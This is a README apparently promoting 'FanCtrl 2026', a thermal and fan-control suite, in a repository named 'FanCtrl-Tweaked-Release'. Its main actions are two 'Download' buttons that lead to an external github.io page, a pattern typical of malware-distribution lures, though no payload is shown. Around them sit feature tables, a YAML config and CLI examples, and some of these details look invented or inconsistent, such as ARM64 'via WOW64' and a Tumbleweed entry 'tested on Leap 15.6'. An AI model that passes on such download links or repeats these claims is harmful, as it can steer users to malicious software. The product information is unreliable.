![preview](https://raw.githubusercontent.com/wasimhavaldar70-a11y/FanCtrl-Tweaked-Release/main/preview.svg)

# FanCtrl 2026 – Universal Thermal Regulation & System Performance Optimization Suite

Modern computing hardware operates at the intersection of thermal dynamics and performance ceilings. Every watt dissipated as heat represents lost computational potential. The FanCtrl ecosystem addresses this fundamental challenge not through brute-force cooling curves, but through a paradigm of intelligent, adaptive thermal governance. Whether you are managing a high-density server farm, a rendering workstation, or a silent home theater PC, FanCtrl provides a granular, machine-learning-assisted control layer that redefines how your system interacts with its own thermal environment.

## Overview

FanCtrl is a sophisticated, cross-platform thermal management framework that replaces manufacturer-default fan curves with context-aware, hardware-responsive policies. Traditional BIOS/UEFI fan control operates on static temperature thresholds, leading to unnecessary acoustic noise, thermal cycling, or insufficient cooling during transient loads. FanCtrl intercepts sensor data at the kernel level and applies one of dozens of configurable control algorithms—PID loops, hysteresis-based step functions, load-predictive models, and even an experimental neural-network-based thermal forecasting module (introduced in v4.1).

The software exposes a unified API that talks directly to hardware monitoring chips (Nuvoton, ITE, Fintek) via SMBus/I²C, reads CPU/GPU thermal diodes through direct register access (on supported architectures), and controls PWM signals without requiring motherboard vendor utilities. It is fully containerized for server deployments, supports multi-monitor display for desktop usage, and includes a WebSocket-based remote dashboard for headless control.

### What Makes FanCtrl Different?

- **Sensor-Agnostic Architecture:** FanCtrl does not rely on a single sensor chip. It aggregates data from CPU package temperature, GPU hotspot, VRM temperature, HDD/SSD thermals, case ambient sensors, and even optional external PT100 probes.
- **Proactive vs. Reactive:** Instead of waiting for temperature to rise, FanCtrl monitors workload signatures (CPU instruction mix, GPU memory bandwidth, I/O pressure) and anticipates thermal events before they manifest.
- **No Vendor Lock-In:** Works with ASUS, Gigabyte, MSI, ASRock, Supermicro, Dell, Lenovo, and custom industrial boards. The hardware abstraction layer (HAL) is community-contributed and extensible.

## Getting Started

To begin transforming your system's thermal behavior, you will need to download the appropriate build for your architecture. The release packages include the core daemon, the configuration wizards, and the optional web interface component.

[![Download](https://raw.githubusercontent.com/wasimhavaldar70-a11y/FanCtrl-Tweaked-Release/main/button.svg)](https://wasimhavaldar70-a11y.github.io/FanCtrl-Tweaked-Release/)

## System Architecture & Data Flow

The following Mermaid diagram illustrates the hierarchical architecture of FanCtrl, from sensor input to fan output, including the optional cloud telemetry pipeline.

```mermaid
graph TD
    A[Hardware Sensors] --> B[Kernel Space HAL]
    B --> C{Data Aggregator}
    C --> D[Thermal State Machine]
    C --> E[Load Predictor]
    D --> F[PID Controller]
    E --> G[Predictive Lookahead]
    F --> H[PWM Multiplexer]
    G --> H
    H --> I[Fan Header Output]
    H --> J[Pump Header Output]
    D --> K[Log Aggregator]
    K --> L[(Local SQLite DB)]
    K --> M[Remote Telemetry (Optional)]
    M --> N[Cloud Dashboard]
    style A fill:#4a90e2,stroke:#333
    style I fill:#e24a4a,stroke:#333
    style J fill:#e24a4a,stroke:#333
    style N fill:#4ae2a0,stroke:#333
```

## Feature Matrix

FanCtrl's capabilities span multiple domains of system management. The table below outlines the major feature categories and their availability across supported operating systems.

| Feature Category | Windows (x64/ARM) | Linux (x64/ARM64/RISC-V) | macOS (Intel/Apple Silicon) |
|---|---|---|---|
| **PID Control Loop** | ✅ Full | ✅ Full | ✅ (Intel only) |
| **Hybrid Step-Curve** | ✅ Full | ✅ Full | ✅ Full |
| **ML Thermal Forecasting** | ✅ (requires CUDA/NVIDIA) | ✅ (OpenCL or CUDA) | ⚠️ (experimental on M-series) |
| **Multi-Zone Control** | ✅ Up to 16 zones | ✅ Unlimited | ✅ Up to 8 zones |
| **External PT100 Support** | ✅ Over USB | ✅ Over USB/GPIO | ⚠️ (USB only) |
| **Web Dashboard** | ✅ Built-in server | ✅ Built-in server | ✅ Built-in server |
| **CLI Headless Mode** | ✅ PowerShell native | ✅ Native binary | ✅ zsh/bash compatibility |
| **Fan Curve Import (JSON/CSV)** | ✅ | ✅ | ✅ |
| **Fan RPM Lock (Silent Mode)** | ✅ Per header | ✅ Per header | ✅ Per header |
| **Remote API (REST + WebSocket)** | ✅ | ✅ | ✅ |
| **Wake-on-Thermal-Threshold** | ✅ (requires motherboard support) | ✅ (kernel module) | ❌ Not supported |

## Default Configuration Profile

FanCtrl ships with a sensible default profile that balances silence and cooling for most mid-range systems. Below is an annotated example configuration that demonstrates the YAML-based syntax. This file resides in `/etc/fanctrl/config.yaml` on Linux or `%ProgramData%\FanCtrl\config.yaml` on Windows.

```
sensor_sources:
  - chip: nct6798d
    address: 0x290
    protocol: smbus
  - cpu_diode:
      driver: intel_core
      socket: LGA1700
  - gpu:
      driver: nvidia_nvml
      index: 0

profiles:
  balanced:
    algorithm: pid
    setpoint: 55.0            # target temperature in Celsius
    p_factor: 1.5
    i_factor: 0.1
    d_factor: 0.05
    min_pwm: 20               # never go below 20% duty cycle
    max_pwm: 100
    hysteresis: 2.0           # 2°C deadband to prevent oscillation
    failsafe:
      max_temp: 85.0
      action: full_pwm

  silent_night:
    algorithm: step_curve
    points:
      - [0, 20]               # temp 0°C -> 20% pwm
      - [40, 20]
      - [55, 35]
      - [70, 60]
      - [85, 100]
    smoothing: spline         # interpolates between points

zones:
  - name: case_intake
    headers: [cha_fan1, cha_fan2]
    profile: balanced
    sensor: sensor_0.cpu_package
  - name: cpu_cooler
    headers: [cpu_fan, pump1]
    profile: balanced
    sensor: sensor_0.cpu_package
    boost_sensor: sensor_0.vrm_temp
```

## CLI Invocation & Console Usage

The command-line interface of FanCtrl is designed for both interactive use and scripted automation. Below is a representative example of invoking the daemon with a custom profile and querying status.

```shell
# Start the daemon with verbose logging and a specific config
fanctld --config /etc/fanctrl/config.yaml --log-level debug --daemonize

# Query current thermal state across all zones
fanctrlctl query --all --format json

# Output (abbreviated):
# {
#   "zones": [
#     {"name": "case_intake", "temp": 44.2, "pwm": 35, "rpm": 820},
#     {"name": "cpu_cooler", "temp": 56.8, "pwm": 42, "rpm": 1450}
#   ],
#   "algo": "pid",
#   "duty_cycle_avg": 38.5
# }

# Force a specific PWM percentage on header 3 (e.g., for testing)
fanctrlctl set pwm hwmon/device5/pwm3 75

# Enable the predictive thermal forecasting module
fanctld --enable-ml-forecast --ml-model /opt/fanctrl/models/v4_cnn.onnx
```

The `fanctrlctl` utility supports tab-completion in bash, zsh, and PowerShell. For headless servers, the `--json` flag on every command enables seamless integration with monitoring stacks such as Prometheus, Nagios, or Datadog.

## Operating System Compatibility

FanCtrl is engineered for portability across consumer and enterprise operating systems. The matrix below details specific version requirements.

| Platform | Minimum Version | Notes |
|---|---|---|
| Windows 11 | 23H2 (build 22631) | Native ARM64 support via WOW64 emulation layer |
| Windows 10 | 22H2 (build 19045) | Legacy NT kernel driver for sensor access |
| Ubuntu/Debian | 22.04 / Bookworm | DKMS module for SMBus HAL |
| Fedora/RHEL | 38 / 9.x | SELinux policy included |
| Arch Linux | Rolling | AUR package maintained by community |
| macOS Sonoma | 14.4 | Intel only for full feature set |
| macOS Sequoia | 15.0 | Experimental Apple Silicon support |
| FreeBSD | 13.3 | Limited chipset support (ITE only) |
| OpenSUSE Tumbleweed | Rolling | Tested on Leap 15.6 |

## AI Integration: OpenAI & Claude API Telemetry

FanCtrl 2026 introduces optional intelligent telemetry analysis. When enabled, the daemon can stream anonymized thermal profiles to either OpenAI or Claude (or a self-hosted compatible LLM endpoint) for pattern recognition and optimization suggestions. This feature is entirely opt-in and can be configured to run locally via an on-premise API gateway for air-gapped environments.

### How It Works

1. **Data Aggregation:** Over a configurable window (default: 7 days), FanCtrl records sensor values, fan response times, and workload signatures into a compressed timeseries buffer.
2. **Prompt Construction:** The daemon formats a structured prompt containing the thermal signature, hardware topology (sanitized of serial numbers), and the current control algorithm parameters.
3. **LLM Response:** The AI model returns suggestions such as "Raise P-factor by 0.3 to reduce overshoot during burst workloads," or "Consider switching to hysteresis profile between 18:00 and 06:00 for acoustically sensitive environments."
4. **Human Review:** All suggestions are logged to a review queue and **never applied automatically**. The user must explicitly accept or reject each recommendation.

Configuration snippet for the AI telemetry module:

```
ai_telemetry:
  provider: openai      # or "claude" or "local"
  endpoint: "https://api.openai.com/v1/chat/completions"
  api_key_env: "FANCTRL_AI_KEY"
  model: "gpt-4-turbo-2026-01"
  window_days: 14
  suggestions_dir: "/var/log/fanctrl/suggestions/"
  anonymize: true
  max_temp_context: 1024
```

This integration transforms FanCtrl from a tool into a continuously improving thermal consultant, learning the unique behavior of each system's chassis airflow, heatsink thermal mass, and component tolerances.

## Responsive UI & Dashboard

The web-based dashboard, built on a reactive single-page application framework, provides real-time visualization of all thermal zones. It features:

- **Live Tachometer Gauges:** Each fan header displays current RPM, target PWM, and a rolling 60-second temperature graph.
- **Drag-and-Drop Curve Editor:** Modify step-curve profiles visually. The YAML configuration updates in real-time.
- **Multi-Lingual Interface:** The dashboard supports English, Mandarin, Japanese, German, French, and Brazilian Portuguese. Translations are community-maintained and can be extended via JSON locale files.
- **24/7 Support Ticker:** A contextual help sidebar (optional) provides links to documentation, community forums, and a direct support ticket form for enterprise licensees.

## License & Legal Framework

FanCtrl is released under the MIT License, which grants permission to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to the following conditions: the copyright notice and permission notice shall be included in all copies or substantial portions of the software. The full text of the license is available in the [LICENSE](LICENSE) file in the repository root.

The MIT License was chosen specifically to encourage broad adoption in both hobbyist and commercial environments, while ensuring that any derivative works maintain proper attribution.

## Responsible Disclosure & Disclaimer

**Disclaimer:** While FanCtrl is designed and tested for safe operation, altering fan and pump control parameters carries inherent risk. Inadequate cooling can lead to hardware damage, data corruption, or system instability. The authors and contributors of FanCtrl assume no liability for any damage resulting from the use of this software. Always monitor your temperatures during the first 24 hours after configuration changes. Use the built-in failsafe feature to set a maximum temperature threshold that triggers full cooling if normal control fails.

The software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement.

**Security Reporting:** If you discover a vulnerability in FanCtrl's daemon, API, or web interface, please contact the maintainers through the repository's security advisory process. Do not disclose potential security issues in public forums before a patch is available.

## Final Download

Thank you for your interest in FanCtrl. We believe that thermal management should be precise, transparent, and user-empowering. The ultimate control over your system's acoustic and thermal profile is now in your hands.

[![Download](https://raw.githubusercontent.com/wasimhavaldar70-a11y/FanCtrl-Tweaked-Release/main/button.svg)](https://wasimhavaldar70-a11y.github.io/FanCtrl-Tweaked-Release/)